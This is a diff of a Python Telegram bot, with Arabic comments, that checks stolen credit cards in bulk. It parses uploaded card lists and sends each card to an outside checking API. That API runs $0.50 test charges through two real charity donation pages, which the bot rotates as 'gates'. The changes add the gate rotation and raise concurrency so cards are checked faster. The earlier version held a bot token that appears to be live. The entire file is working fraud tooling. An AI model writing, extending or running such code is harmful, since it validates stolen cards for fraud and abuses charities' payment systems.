@@ -6,40 +6,57 @@ import httpx
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'
+TOKEN = 'PUT_YOUR_TOKEN_HERE'
+
 API_URL = "http://gatescheck.duckdns.org:7000/check"
 
+# البوابات (تبديل تلقائي)
+GATES = [
+    "https://raybensch.com/donations/support-ray/",
+    "https://www.wfft.org/donations/general-donation/"
+]
+
+gate_index = 0
 stop_users = {}
 
-# تقليل الضغط على API
-api_semaphore = asyncio.Semaphore(2)
-client = httpx.AsyncClient(timeout=15)
+# تسريع
+api_semaphore = asyncio.Semaphore(6)
 
 # ------------------- BIN Lookup -------------------
 async def get_bin_info(bin_number):
-    url = f"https://lookup.binlist.net/{bin_number}"
     try:
-        r = await client.get(url)
-        data = r.json()
-        brand = data.get("scheme", "N/A")
-        card_type = data.get("type", "N/A")
-        bank = data.get("bank", {}).get("name", "N/A")
-        country = data.get("country", {}).get("name", "N/A")
-        return f"{brand} - {card_type}", bank, country
+        async with httpx.AsyncClient(timeout=10) as client:
+            r = await client.get(f"https://lookup.binlist.net/{bin_number}")
+            data = r.json()
+
+            brand = data.get("scheme", "N/A")
+            card_type = data.get("type", "N/A")
+            bank = data.get("bank", {}).get("name", "N/A")
+            country = data.get("country", {}).get("name", "N/A")
+
+            return f"{brand} - {card_type}", bank, country
     except:
         return "N/A", "N/A", "N/A"
 
 # ------------------- Check API -------------------
 async def check_card_api(card_full):
+    global gate_index
+
+    # تبديل تلقائي بين البوابات
+    gate = GATES[gate_index]
+    gate_index = (gate_index + 1) % len(GATES)
+
     params = {
-        "url": "https://www.wfft.org/donations/general-donation/",
+        "url": gate,
         "card": card_full,
         "amount": 0.50
     }
 
     async with api_semaphore:
         try:
-            r = await client.get(API_URL, params=params)
+            async with httpx.AsyncClient(timeout=20) as client:
+                r = await client.get(API_URL, params=params)
+
             result_raw = r.json().get('result', '')
             result = result_raw.lower()
 
@@ -49,6 +66,7 @@ async def check_card_api(card_full):
                 return "live", "Insufficient Funds"
             else:
                 return "declined", result_raw
+
         except:
             return "declined", "Error"
 
@@ -82,6 +100,7 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card_full = " ".join(context.args)
+
     if not card_full:
         await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
         return
@@ -95,8 +114,7 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ------------------- /stop -------------------
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    stop_users[user_id] = True
+    stop_users[update.effective_user.id] = True
     await update.message.reply_text("Stopped ⛔")
 
 # ------------------- File Handler -------------------
@@ -107,52 +125,45 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_users[user_id] = False
 
-    if not os.path.exists('downloads'):
-        os.makedirs('downloads')
+    os.makedirs("downloads", exist_ok=True)
 
     file = await update.message.document.get_file()
     file_path = f"downloads/{file.file_id}.txt"
     await file.download_to_drive(file_path)
 
     approved = live = declined = 0
-    last_card = last_response = last_status = last_panel = ""
-
     panel_msg = await update.message.reply_text("Start Checking... 🔍")
 
     with open(file_path, 'r', encoding='utf-8') as f:
-        for line in f:
-            if stop_users.get(user_id):
-                await update.message.reply_text("Stopped ⛔")
-                return
+        lines = f.readlines()
 
-            line = line.strip()
-            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
-            if not match:
-                continue
+    for i, line in enumerate(lines):
+        if stop_users.get(user_id):
+            await update.message.reply_text("Stopped ⛔")
+            return
 
-            card_full = match[0]
+        match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+        if not match:
+            continue
 
-            start_time = time.time()
-            status, response = await check_card_api(card_full)
-            taken = round(time.time() - start_time, 2)
+        card_full = match[0]
 
-            last_card = card_full
-            last_response = response
+        start_time = time.time()
+        status, response = await check_card_api(card_full)
+        taken = round(time.time() - start_time, 2)
 
-            if status == "approved":
-                approved += 1
-                last_status = "Charge ✅"
-            elif status == "live":
-                live += 1
-                last_status = "Live 🟢"
-            else:
-                declined += 1
-                last_status = "Declined ❌"
+        if status == "approved":
+            approved += 1
+        elif status == "live":
+            live += 1
+        else:
+            declined += 1
 
-            if status in ["approved", "live"]:
-                text = await format_response(card_full, status, response, taken)
-                await update.message.reply_text(text)
+        if status in ["approved", "live"]:
+            text = await format_response(card_full, status, response, taken)
+            await update.message.reply_text(text)
 
+        if i % 5 == 0:
             panel = f"""📊 Status
 
 ✅ Charge: {approved}
@@ -160,23 +171,14 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ❌ Declined: {declined}
 📂 Total: {approved + live + declined}
 
-━━━━━━━━━━━━━━━
-💳 Last Card: {last_card}
-📨 Response: {last_response}
-📌 Status: {last_status}
-━━━━━━━━━━━━━━━
-
 ⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
 """
+            try:
+                await panel_msg.edit_text(panel)
+            except:
+                pass
 
-            if panel != last_panel:
-                try:
-                    await panel_msg.edit_text(panel)
-                    last_panel = panel
-                except:
-                    pass
-
-            await asyncio.sleep(1)
+        await asyncio.sleep(0.2)
 
     await update.message.reply_text("Done ✅")
 
